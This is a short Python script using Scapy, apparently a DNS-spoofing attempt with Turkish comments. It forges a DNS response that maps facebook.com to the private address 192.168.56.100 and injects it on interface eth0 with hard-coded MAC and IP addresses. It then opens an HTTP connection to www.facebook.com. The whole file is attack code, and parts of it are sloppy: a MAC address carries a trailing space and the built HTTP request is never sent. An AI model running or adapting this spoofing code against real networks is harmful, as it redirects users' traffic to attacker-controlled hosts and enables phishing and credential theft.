from scapy.all import *



target_mac = "70:79:b3:6a:c9:00"
source_mac = "70:66:55:78:b7:f5 "
target_ip="10.106.4.20"
source_ip="10.61.65.44"


# DNS isteği 
dns_request = Ether(dst=target_mac, src=source_mac) / \
              IP(dst=target_ip, src=source_ip) / \
              UDP(sport=53, dport=53) / \
              DNS(id=12345, qr=0, opcode=0, rd=1, qdcount=1, qd=DNSQR(qname="facebook.com"))

# DNS cevabı
dns_response = Ether(dst=source_mac, src=target_mac) / \
               IP(dst=source_ip, src=target_ip) / \
               UDP(sport=53, dport=57041) / \
               DNS(id=dns_request[DNS].id, qr=1, aa=1, ra=1, qdcount=1, ancount=1, \
                   qd=dns_request[DNS].qd, an=DNSRR(rrname="facebook.com", type=1, ttl=3600, rdata="192.168.56.100"))

# Paket
sendp(dns_response,iface="eth0")
load_layer("http")
req = HTTP()/HTTPRequest(
    Accept_Encoding=b'gzip, deflate',
    Cache_Control=b'no-cache',
    Connection=b'keep-alive',
    Host=b'www.facebook.com',
    Pragma=b'no-cache'
)
a = TCP_client.tcplink(HTTP, "www.facebook.com", 80)



print(" Paket Gönderildi:")
print(dns_response.show())
